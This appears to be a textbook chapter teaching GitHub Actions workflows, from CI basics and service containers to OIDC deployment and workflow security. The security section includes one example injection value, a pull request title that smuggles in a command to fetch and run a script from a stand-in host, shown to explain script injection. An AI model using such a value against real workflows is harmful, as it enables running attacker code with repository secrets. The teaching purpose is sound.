# GitHub Actions

> [!GOALS]
> - Read and write GitHub Actions **workflows**: triggers, jobs, steps, runners and actions.
> - Build a complete CI workflow for a Node.js service: install with caching, lint, type check, test, and run integration tests against real **service containers**.
> - Pass data between steps and jobs, use **matrices**, **concurrency** and **conditions**.
> - Deploy safely with **environments**, approvals and **OIDC** credentials instead of stored cloud keys.
> - Reuse workflow logic and keep workflows secure: permissions, secrets, pinned actions, forks.

## Why this matters

{{ch:cicd}} explained what a pipeline should do. GitHub Actions is the tool most teams on GitHub use to do it: the pipeline lives in the repository as YAML files, runs on GitHub's machines (or your own), and reports its results directly on commits and pull requests. Because it is built into GitHub ({{ch:github}}), there is nothing to install or host, which is why it has become the default CI/CD system for open-source projects, start-ups and many large companies.

You will read workflows on your first day in most teams — to understand why your pull request has a red cross — and you will soon write and fix them. Workflows also hold real power: they hold secrets and deploy to production. Writing them securely matters as much as writing them correctly.

## The simple idea

A workflow is a recipe card stored in the repository that says: "**when** this happens (a push, a pull request, a schedule), **on** this kind of machine, do **these** steps in order." GitHub watches for the events, picks up the card, borrows a fresh machine, follows the steps and pins the result (a green tick or a red cross) next to your commit.

> [!ANALOGY]
> A workflow is like a recipe card that a kitchen assistant follows whenever an order arrives: a fresh clean kitchen each time, the same steps in the same order, and a note on the order saying whether it worked.
>
> **Where the analogy breaks:** a kitchen assistant would notice if a recipe said "send the safe's key to this stranger". A runner does exactly what the YAML says, with whatever secrets and permissions you gave it — including steps written by third parties (actions) and, if you are careless, code from strangers' pull requests. The care has to be in the workflow.

## The proper definition and key words

**GitHub Actions** is GitHub's automation platform: **workflows** defined in YAML files in `.github/workflows/` are triggered by **events**, and run one or more **jobs** on **runners**; each job is a sequence of **steps**, each running a shell command or an **action**.

Key words:

- **Workflow** — a YAML file in `.github/workflows/` describing an automated process.
- **Event / trigger** — what starts a workflow (`on:`): `push`, `pull_request`, `schedule`, `workflow_dispatch` (manual), `release` and many more.
- **Job** — a set of steps running on one runner; jobs run in parallel unless one `needs` another.
- **Step** — one command (`run:`) or one action (`uses:`).
- **Action** — a reusable step published in a repository, such as `actions/checkout`.
- **Runner** — the machine running a job: GitHub-hosted (`ubuntu-latest`) or self-hosted.
- **Expression** — `${{ … }}` syntax for values: contexts, functions, conditions.
- **Context** — data available to expressions: `github`, `env`, `secrets`, `vars`, `matrix`, `needs`, `steps`, `runner`.
- **Matrix** — running one job definition with several combinations of values.
- **Service container** — a container (such as PostgreSQL) started next to a job for integration tests.
- **Artifact** — files uploaded by one job for later jobs or for download.
- **Environment** — a named deployment target (staging, production) with its own secrets and protection rules.
- **`GITHUB_TOKEN`** — an automatic, short-lived token scoped to the repository, with configurable `permissions`.

## The first workflow

### Level 1 — Anatomy of a workflow

```yaml
# .github/workflows/ci.yml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read              # least privilege for the automatic GITHUB_TOKEN

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4                     # get the repository's code
      - uses: actions/setup-node@v4                   # install Node.js
        with:
          node-version-file: .nvmrc
          cache: npm                                  # cache ~/.npm keyed on package-lock.json
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test
```

Reading it from top to bottom:

- **`on`**: run on every pull request and on every push to `main`.
- **`permissions`**: the automatic `GITHUB_TOKEN` may only read the code. Set this at the top of every workflow; grant more per job only where needed.
- **`jobs.test`**: one job on a fresh Ubuntu virtual machine, cancelled if it runs longer than 15 minutes.
- **`steps`**: two actions (check out the code, set up Node with npm caching), then four shell commands. If any command exits non-zero, the step fails, later steps are skipped and the job fails ({{ch:shell-scripting}}).
- On a pull request, the result appears as a **check**; with a branch protection rule requiring it, the pull request cannot be merged until it passes ({{ch:github}}).

### Level 2 — Jobs, dependencies and service containers

Integration tests need a real database. **Service containers** start next to the job and are reachable on `localhost` through mapped ports:

```yaml
# .github/workflows/ci.yml (continued)
jobs:
  checks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci
      - run: npm run lint && npm run typecheck && npm run test:unit

  integration:
    runs-on: ubuntu-latest
    needs: checks                     # only after the fast checks pass
    services:
      postgres:
        image: postgres:18
        env:
          POSTGRES_USER: shop
          POSTGRES_PASSWORD: shop
          POSTGRES_DB: shop_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U shop"
          --health-interval 5s --health-timeout 5s --health-retries 10
    env:
      DATABASE_URL: postgres://shop:shop@localhost:5432/shop_test
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci
      - run: npm run db:migrate
      - run: npm run test:integration
```

- **`needs: checks`** orders the jobs: the slower integration job runs only if lint, types and unit tests passed. Jobs without `needs` run in parallel.
- **`services`** starts PostgreSQL in a container ({{ch:docker}}); the health-check options make GitHub wait until the database accepts connections before the steps start.
- A job-level **`env`** gives every step the same `DATABASE_URL`. The password here is a throwaway test credential in a throwaway container, not a secret.
- Each job runs on a **separate fresh machine**, which is why each one checks out and installs again. Pass build outputs between jobs with `actions/upload-artifact` and `actions/download-artifact`.

### Level 2 — Talking to the runner: outputs, summaries and annotations

Steps communicate with the runner through special files and lines of output. A script can:

- append `name=value` lines to the file named by **`$GITHUB_OUTPUT`** to set step outputs, used later as `steps.<id>.outputs.<name>`;
- append Markdown to **`$GITHUB_STEP_SUMMARY`** to show a summary on the run's page;
- print **workflow commands** such as `::error file=…,line=…::message` or `::warning …` to create annotations on the pull request.

This step script is a coverage gate. The top lines create the files the runner would provide, so it also runs on your machine:

```ts
import { appendFileSync, mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// --- what the runner provides (simulated here so the script can run anywhere) ---
const dir = mkdtempSync(join(tmpdir(), "gha-"));
process.env.GITHUB_OUTPUT ??= join(dir, "output");
process.env.GITHUB_STEP_SUMMARY ??= join(dir, "summary");
process.env.GITHUB_SHA ??= "4f9c2e1a7b3d5f60812c9e4b7a1d3f5e6c8b0a29";
process.env.GITHUB_REF_NAME ??= "main";

// --- the step's script: a coverage gate that reports in the formats Actions understands ---
type FileCoverage = { file: string; lines: number; covered: number };
const report: FileCoverage[] = [
  { file: "src/orders/service.ts", lines: 120, covered: 111 },
  { file: "src/orders/refunds.ts", lines: 80, covered: 41 },
  { file: "src/payments/client.ts", lines: 60, covered: 57 },
];
const minimum = 80;

let total = 0, covered = 0;
for (const f of report) {
  total += f.lines; covered += f.covered;
  const pct = (100 * f.covered) / f.lines;
  // workflow commands on stdout become annotations on the pull request's changed files
  if (pct < minimum) console.log(`::warning file=${f.file},title=Low coverage::${pct.toFixed(1)}% of lines covered`);
}
const pct = (100 * covered) / total;

const tag = `${process.env.GITHUB_REF_NAME}-${process.env.GITHUB_SHA!.slice(0, 7)}`;
appendFileSync(process.env.GITHUB_OUTPUT!, `coverage=${pct.toFixed(1)}\nimage-tag=${tag}\n`);
appendFileSync(process.env.GITHUB_STEP_SUMMARY!, `### Coverage\n\n| Lines | Covered | % |\n|---|---|---|\n| ${total} | ${covered} | ${pct.toFixed(1)} |\n`);

if (pct < minimum) {
  console.log(`::error title=Coverage gate::${pct.toFixed(1)}% is below ${minimum}%`);
  process.exitCode = 1;
} else console.log(`coverage ${pct.toFixed(1)}% (minimum ${minimum}%)`);

console.log("--- $GITHUB_OUTPUT now contains:");
console.log(readFileSync(process.env.GITHUB_OUTPUT!, "utf8").trim());
```

**Output:**

```text
::warning file=src/orders/refunds.ts,title=Low coverage::51.3% of lines covered
coverage 80.4% (minimum 80%)
--- $GITHUB_OUTPUT now contains:
coverage=80.4
image-tag=main-4f9c2e1
```

- The total passes the gate (80.4%), but the refunds file is only half covered — the **warning annotation** shows that on the pull request, right next to the file, without failing the build. A single overall number hides this kind of gap ({{ch:testing}}).
- The **outputs** become available to later steps. With `id: coverage` on this step, a later step can use `${{ steps.coverage.outputs.image-tag }}`; a job can expose them to other jobs through `outputs:` and `needs.<job>.outputs`.
- The script sets `process.exitCode = 1` on failure; the step fails because the process exits non-zero, exactly as in {{ch:cicd}}.

## Making workflows efficient

### Level 3 — Caching, matrices and concurrency

```yaml
# fragment
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]
        exclude:
          - os: windows-latest
            node: 20
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npm test

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

- **Caching**: `setup-node`'s `cache: npm` restores the npm download cache keyed on the lock file. For anything else, `actions/cache` takes a `path` and a `key` (usually including `hashFiles('**/package-lock.json')`). Docker builds use the BuildKit cache (`cache-from: type=gha`).
- **Matrix**: one job definition, many combinations — here five jobs (six minus one excluded). Libraries use matrices to test several Node.js versions and operating systems; applications usually only need the version they deploy. `fail-fast: false` lets every combination finish so you see all failures.
- **Concurrency**: a new push to the same pull request cancels the previous run that is still in progress — saving minutes and money. On `main`, runs are not cancelled, so every merged commit is tested and deployed in order.
- **Path filters** (`on.push.paths`) skip workflows when unrelated files change, which is useful in monorepos.

### Level 3 — Conditions and expressions

```yaml
# fragment
- name: Notify on failure
  if: failure() && github.ref == 'refs/heads/main'
  run: ./scripts/notify.sh "CI failed on main at ${GITHUB_SHA::7}"
```

- **`if:`** runs a step or job only when a condition is true. Status functions — `success()` (the default), `failure()`, `always()`, `cancelled()` — let cleanup and notification steps run after failures.
- **Contexts** give data about the run: `github.ref`, `github.sha`, `github.event_name`, `github.actor`, `runner.os`, `matrix.node`.
- Values from contexts that **users control** — pull request titles, branch names, issue bodies — must never be pasted directly into a `run:` script with `${{ }}`; see the security section.

## Deploying

### Level 4 — Build, push and deploy with environments and OIDC

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write             # push images to GitHub Container Registry
    outputs:
      image: ${{ steps.meta.outputs.image }}
    steps:
      - uses: actions/checkout@v4
      - id: meta
        run: echo "image=ghcr.io/${GITHUB_REPOSITORY,,}:${GITHUB_SHA}" >> "$GITHUB_OUTPUT"
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v6
        with:
          push: true
          tags: ${{ steps.meta.outputs.image }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    permissions:
      id-token: write             # allow requesting an OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: eu-west-2
      - run: ./scripts/deploy.sh "${{ needs.build.outputs.image }}" staging

  deploy-production:
    needs: [build, deploy-staging]
    runs-on: ubuntu-latest
    environment: production       # protection rules: required reviewers, main branch only
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: eu-west-2
      - run: ./scripts/deploy.sh "${{ needs.build.outputs.image }}" production
```

- **Build once, promote**: the `build` job pushes one image tagged with the full commit SHA; both deployment jobs receive the same image name through job outputs ({{ch:cicd}}).
- **Environments** (`environment: production`) hold environment-specific variables and secrets and **protection rules**: required reviewers, a wait timer, and which branches may deploy. The production job pauses until someone approves.
- **OIDC instead of stored keys**: with `id-token: write`, the job requests a signed token from GitHub describing the repository, branch and environment. The cloud provider is configured to trust tokens from this repository and environment only, and returns **short-lived** credentials for the deployment role ({{ch:iam}}). No long-lived AWS keys are stored in GitHub at all.
- `vars.DEPLOY_ROLE_ARN` is a configuration **variable** (not secret); `secrets.*` are encrypted and masked in logs.

### Level 4 — Reusable workflows and composite actions

When ten services have nearly the same pipeline, copy-paste becomes drift. Two ways to share:

- A **reusable workflow** (`on: workflow_call` with `inputs` and `secrets`) is called as a whole job: `uses: my-org/pipelines/.github/workflows/node-service.yml@v3`.
- A **composite action** (`action.yml` with `runs.using: composite`) bundles several steps that you use inside your own jobs.

Platform teams publish versioned reusable workflows as the organisation's "golden path", so a fix to the pipeline reaches every service with a version bump.

## Security

### Level 4 — Workflows hold the keys

- **Least-privilege `GITHUB_TOKEN`**: `permissions: contents: read` at the top; grant `packages: write`, `id-token: write`, `pull-requests: write` only to the jobs that need them.
- **Pin third-party actions to a full commit SHA** (`uses: some-org/some-action@8f4b7f8…  # v2.1.0`). A tag like `@v2` can be moved by whoever controls that repository — a compromised action runs with your secrets. Official `actions/*` are often pinned by major version; many organisations pin everything and let Dependabot update the SHAs.
- **Untrusted input injection**: never write `run: echo "${{ github.event.pull_request.title }}"`. The title is inserted into the script **before** the shell runs, so a title like `"; curl evil.sh | sh; "` becomes code. Pass it through an environment variable instead (`env: TITLE: ${{ github.event.pull_request.title }}` and `run: echo "$TITLE"`).
- **Forks**: workflows triggered by `pull_request` from forks receive no secrets and a read-only token — keep it that way. The `pull_request_target` trigger runs with the base repository's secrets; never check out and run the fork's code inside it.
- **Secrets**: store them in repository, environment or organisation secrets; they are masked in logs, but a step that transforms a secret (base64, splitting) can leak it. Prefer OIDC so there is no secret at all.
- **Self-hosted runners** keep state between jobs; never use them for public repositories, where anyone can open a pull request that runs code on them.

## From beginner to enterprise

**Level 1–2 — first workflows.** A CI workflow on pull requests with checkout, cached install, lint, type check and tests; required checks; service containers for integration tests; outputs and artifacts between steps and jobs.

**Level 3 — efficient workflows.** Caching; matrices where needed; concurrency groups; path filters; conditions; job summaries and annotations that make failures easy to read.

**Level 4 — deployment.** Image builds tagged by SHA; environments with protection rules; OIDC credentials; least-privilege permissions; pinned actions; safe handling of untrusted input.

**Level 5 — senior practice.** Reusable workflows and composite actions; measuring and reducing pipeline time and cost; larger or self-hosted runners where justified; dependency update automation for actions.

**Level 6 — enterprises.** Organisation-wide required workflows and rulesets; approved-actions allow lists; central runner fleets; audit and compliance reporting from workflow runs.

## Real-world use cases

### Pull request checks for a Node.js API

- **Setup**: a `checks` job (lint, types, unit tests) and an `integration` job with PostgreSQL and Redis service containers, both required for merging; coverage warnings annotated on changed files; concurrent runs on the same pull request cancelled.

### Deploying from `main`

- **Setup**: merge to `main` builds and pushes an image tagged with the SHA, deploys to staging with OIDC credentials, runs smoke tests, then waits for an approval on the `production` environment before deploying the same image.

## Common mistakes

### Beginner: no `permissions` block

**Consequence:** the token may have write access to the whole repository. **Fix:** `contents: read` by default.

### Beginner: no dependency caching

**Consequence:** slow runs. **Fix:** `setup-node` caching or `actions/cache`.

### Beginner: secrets in YAML or printed in logs

**Fix:** repository or environment secrets; OIDC for cloud access.

### Intermediate: unpinned third-party actions

**Consequence:** a compromised tag runs in your pipeline with your secrets. **Fix:** pin to commit SHAs and update deliberately.

### Intermediate: `${{ }}` with user input inside `run:`

**Consequence:** script injection. **Fix:** pass through `env` and quote the variable.

### Intermediate: copy-pasted workflows across many repositories

**Consequence:** drift and slow fixes. **Fix:** reusable workflows and composite actions.

### Production: long-lived cloud keys in secrets

**Fix:** OIDC with roles restricted to repository, branch and environment.

### Production: `pull_request_target` running fork code

**Consequence:** strangers' code runs with your secrets. **Fix:** do not check out untrusted code in privileged triggers.

## Debugging and troubleshooting

- **Workflow did not start**: check the `on:` filters (branches, paths), that the file is on the right branch, and YAML indentation.
- **"Works locally, fails in CI"**: Linux file-name case sensitivity, missing environment variables, different tool versions; print versions in a step.
- **Service container unreachable**: wrong port mapping, or missing health-check options so tests start before the database is ready. When the job itself runs inside a container, use the service's name as the host instead of `localhost`.
- **Permission errors pushing images or commenting**: missing job `permissions`.
- **More logs**: re-run the job with debug logging enabled; add `set -x` to shell steps.
- **Slow runs**: the run's timing view shows each step; look for missed caches and serial jobs.

## Security summary

- **Least-privilege** `GITHUB_TOKEN` permissions in every workflow and job.
- **OIDC** for cloud access; no stored long-lived keys.
- **Pin** third-party actions to commit SHAs; keep them updated deliberately.
- **Never interpolate untrusted input** into scripts; use environment variables.
- **No secrets for fork pull requests**; beware `pull_request_target`.
- **Environments with protection rules** for production; restrict which branches can deploy.
- **No self-hosted runners for public repositories.**

## How a senior engineer thinks about this

- **The workflow is code.** Reviewed, versioned, tested and refactored like application code.
- **Fast feedback first.** Cheap checks early, parallel jobs, caches and cancelled stale runs.
- **Every permission is a risk.** Least privilege, short-lived credentials, pinned dependencies.
- **One artifact, many environments.** Build once and promote with approvals.
- **Share the good path.** Reusable workflows so every team gets the secure, fast pipeline by default.

## Exercises

### Exercise 1 — Write a CI workflow

**Objective:** practise workflow basics.
**What to do:** write a workflow that runs on pull requests and pushes to `main`, uses Node.js 22 with npm caching, runs `npm ci`, `npm run lint` and `npm test`, has read-only permissions and a 10-minute timeout, and cancels in-progress runs for the same pull request.

<details>
<summary>Show the solution</summary>

```yaml
name: CI
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run lint
      - run: npm test
```

</details>

### Exercise 2 — Find the security problems

**Objective:** practise workflow security review.
**The workflow:** triggered by `pull_request_target`; no `permissions` block; uses `some-user/deploy-helper@main`; a step runs `echo "Building ${{ github.event.pull_request.head.ref }}"`; it checks out the pull request's head commit and runs `npm install && npm test`; AWS keys are stored as `secrets.AWS_KEY` and `secrets.AWS_SECRET`.

<details>
<summary>Show the solution</summary>

1. **`pull_request_target` + checking out and running the fork's code** — strangers' code runs with the base repository's secrets and token. Use `pull_request` for running tests on untrusted code.
2. **No `permissions`** — the token may have broad write access. Add `contents: read`.
3. **`@main` on a third-party action** — anyone controlling that repository can change what runs. Pin to a reviewed commit SHA.
4. **Branch name interpolated into `run:`** — branch names are attacker-controlled; this is script injection. Pass through `env:` and use `"$BRANCH"`.
5. **Long-lived AWS keys** — replace with OIDC and a role trusted only for this repository's `main` branch and environment.

</details>

### Exercise 3 — Production scenario: the slow, expensive pipeline

**Objective:** practise optimising workflows.
**The scenario:** every push to every pull request runs a 35-minute workflow: one job that installs dependencies without caching, runs lint, unit tests, integration tests and end-to-end tests serially, and builds a Docker image without cache. Developers push several times per pull request. What do you change?

<details>
<summary>Show the solution</summary>

1. **Cache** npm downloads (`setup-node` `cache: npm`) and Docker layers (`cache-from/cache-to: type=gha`).
2. **Split into parallel jobs**: lint and types, unit tests, integration tests (service containers), and the image build; end-to-end tests after the build, or only on `main` and before releases if they are slow.
3. **Concurrency** with `cancel-in-progress` for pull requests, so only the latest push runs.
4. **Split slow test suites** across several jobs with a matrix of shards.
5. **Path filters** so documentation-only changes skip the heavy jobs.
6. Measure the result in the run timings; aim for about ten minutes to a result.

</details>

## Summary

**GitHub Actions** runs **workflows** stored as YAML in `.github/workflows/`. **Events** (`push`, `pull_request`, `schedule`, `workflow_dispatch`) trigger them; **jobs** run on fresh **runners**, in parallel unless ordered with `needs`; **steps** run shell commands or reusable **actions**, and a non-zero exit code fails the step and job. Results appear as checks on commits and pull requests and can be required before merging.

A CI workflow checks out the code, sets up Node with **caching**, installs with `npm ci` and runs lint, type checks and tests; **service containers** provide real databases for integration tests. Steps talk to the runner through `$GITHUB_OUTPUT` (outputs), `$GITHUB_STEP_SUMMARY` (summaries) and workflow commands (annotations). **Matrices** run combinations, **concurrency** cancels stale runs, `if:` conditions and status functions control what runs.

Deployment workflows **build once** (images tagged with the SHA), pass the image between jobs, and deploy through **environments** with protection rules, using **OIDC** for short-lived cloud credentials. **Reusable workflows** and **composite actions** share pipelines. Security means least-privilege `permissions`, actions pinned to commit SHAs, never interpolating untrusted input into scripts, no secrets for fork code, and no self-hosted runners on public repositories.

## Key terms

- **GitHub Actions** — GitHub's built-in automation and CI/CD platform.
- **Workflow** — An automated process defined in a YAML file in `.github/workflows/`.
- **Event** — Something that triggers a workflow, such as a push or pull request.
- **Job** — A group of steps that runs on one runner.
- **Step** — A single shell command or action within a job.
- **Action** — A reusable, published step.
- **Runner** — The machine that executes a job.
- **Expression** — A `${{ }}` value computed from contexts and functions.
- **Context** — Information available to expressions, such as `github` or `secrets`.
- **Matrix** — A strategy that runs a job for several combinations of values.
- **Service container** — A container started alongside a job, such as a test database.
- **Workflow artifact** — Files uploaded by a job for later jobs or download.
- **Job output** — A value a job exposes to jobs that depend on it.
- **Workflow command** — A specially formatted output line that creates annotations or controls the runner.
- **Concurrency group** — A key that limits runs so newer ones can cancel older ones.
- **Environment** — A deployment target with its own secrets and protection rules.
- **`GITHUB_TOKEN`** — An automatic, repository-scoped token whose permissions the workflow sets.
- **OIDC** — Exchanging a signed identity token for short-lived cloud credentials.
- **Reusable workflow** — A workflow that other workflows call as a job.
- **Composite action** — An action made of several steps.
- **Script injection** — Untrusted input becoming executable code in a workflow script.

## What comes next

GitHub Actions is not the only CI system. Many established companies run **Jenkins**, a self-hosted automation server with decades of plugins and pipelines written in code. The next chapter, {{ch:jenkins}}, explains Jenkins pipelines, agents, credentials and the trade-offs of running your own CI server.
